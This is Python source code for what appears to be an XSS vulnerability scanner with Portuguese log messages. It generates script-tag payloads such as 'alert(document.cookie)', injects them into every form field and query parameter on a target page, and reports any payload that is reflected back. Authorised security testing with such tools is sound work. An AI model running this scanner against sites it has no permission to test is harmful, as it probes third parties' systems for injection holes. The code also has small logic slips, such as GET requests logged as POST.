from lib.helper.helper import *
from random import randint
from bs4 import BeautifulSoup
from urllib.parse import urljoin,urlparse,parse_qs,urlencode
from lib.helper.Log import *

class core:
	
	@classmethod
	def generate(self,eff):		
		FUNCTION=[
			"prompt(5000/200)",
			"alert(6000/3000)",
			"alert(document.cookie)",
			"prompt(document.cookie)",
			"console.log(5000/3000)"
		]
		if eff == 1:
			return "<script/>"+FUNCTION[randint(0,4)]+"<\script\>"
		
		elif eff == 2:
			return "<\script/>"+FUNCTION[randint(0,4)]+"<\\script>"	
			
		elif eff == 3:
			return "<\script\> "+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 4:
			return "<script>"+FUNCTION[randint(0,4)]+"<\script/>"
			
		elif eff == 5:
			return "<script>"+FUNCTION[randint(0,4)]+"<//script>"
			
		elif eff == 6:
			return "<script>"+FUNCTION[randint(0,4)]+"</script>"
			
	@classmethod
	def post_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		
		for form in forms:
			try:
				action=form["action"]
			except KeyError:
				action=self.url
				
			if form["method"].lower().strip() == "post":
				Log.warning("O destino tem formulário com o método POST: "+C+urljoin(self.url,action))
				Log.info("Coletando a chave de entrada do formulário.....")
				
				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
							Log.info("Nome da chave do formulário: "+G+key["name"]+N+" valor: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("Nome da chave do formulário: "+G+key["name"]+N+" valor: "+G+self.payload)
							keys.update({key["name"]:self.payload})
							
					except Exception as e:
						Log.info("Erro interno: "+str(e))
				
				Log.info("Enviando método de (POST) Payload...")
				req=self.session.post(urljoin(self.url,action),data=keys)
				if self.payload in req.text:
					Log.high("XSS (POST) detectado em "+urljoin(self.url,req.url))
					Log.high("Dados do POST "+str(keys))
				else:
					Log.info("Página de parâmetro usando Payloads (POST), mas ainda não está carregada 100%...")
	
	@classmethod
	def get_method_form(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		forms=bsObj.find_all("form",method=True)
		
		for form in forms:
			try:
				action=form["action"]
			except KeyError:
				action=self.url
				
			if form["method"].lower().strip() == "get":
				Log.warning("O alvo tem formulário com o método GET: "+C+urljoin(self.url,action))
				Log.info("Coletando a chave de entrada do formulário.....")
				
				keys={}
				for key in form.find_all(["input","textarea"]):
					try:
						if key["type"] == "submit":
							Log.info("Nome da chave do formulário: "+G+key["name"]+N+" valor: "+G+"<Submit Confirm>")
							keys.update({key["name"]:key["name"]})
				
						else:
							Log.info("Nome da chave do formulário: "+G+key["name"]+N+" valor: "+G+self.payload)
							keys.update({key["name"]:self.payload})
							
					except Exception as e:
						Log.info("Erro interno: "+str(e))
						try:
							Log.info("Nome da chave do formulário: "+G+key["name"]+N+" valor: "+G+self.payload)
							keys.update({key["name"]:self.payload})
						except KeyError as e:
							Log.info("Erro interno: "+str(e))
						
				Log.info("Enviando método de (POST) Payload...")
				req=self.session.get(urljoin(self.url,action),params=keys)
				if self.payload in req.text:
					Log.high("XSS (POST) detectado em "+urljoin(self.url,req.url))
					Log.high("Dados GET: "+str(keys))
				else:
					Log.info("\033[0;35;47m Página de parâmetro usando Payloads (POST), mas ainda não está carregada 100%....")
		
	@classmethod
	def get_method(self):
		bsObj=BeautifulSoup(self.body,"html.parser")
		links=bsObj.find_all("a",href=True)
		for a in links:
			url=a["href"]
			if url.startswith("http://") is False or url.startswith("https://") is False or url.startswith("mailto:") is False:
				base=urljoin(self.url,a["href"])
				query=urlparse(base).query
				if query != "":
					Log.warning("Link encontrado com consulta: "+G+query+N+" Provavelmente um ponto de vuln. XSS")
					
					query_payload=query.replace(query[query.find("=")+1:len(query)],self.payload,1)
					test=base.replace(query,query_payload,1)
					
					query_all=base.replace(query,urlencode({x: self.payload for x in parse_qs(query)}))
					
					Log.info("Consulta (GET) : "+test)
					Log.info("Consulta (GET) : "+query_all)
					
					_respon=self.session.get(test)
					if self.payload in _respon.text or self.payload in self.session.get(query_all).text:
						Log.high("Detectado XSS (GET) em "+_respon.url)
					else:
						Log.info(" Página de parâmetro usando Payloads (POST), mas ainda não está carregada 100%....")
	
	@classmethod
	def main(self,url,proxy,headers,payload,cookie,method=2):
	
		print(W+"*"*15)
		self.payload=payload
		self.url=url
		
		self.session=session(proxy,headers,cookie)
		Log.info("Verificando conexão com: "+Y+url)	
		try:
			ctr=self.session.get(url)
			self.body=ctr.text
		except Exception as e:
			Log.high("Erro interno: "+str(e))
			return
		
		if ctr.status_code > 400:
			Log.info("Falha na conexão "+G+str(ctr.status_code))
			return 
		else:
			Log.info("Conexão estabelecida "+G+str(ctr.status_code))
		
		if method >= 2:
			self.post_method()
			self.get_method()
			self.get_method_form()
			
		elif method == 1:
			self.post_method()
			
		elif method == 0:
			self.get_method()
			self.get_method_form()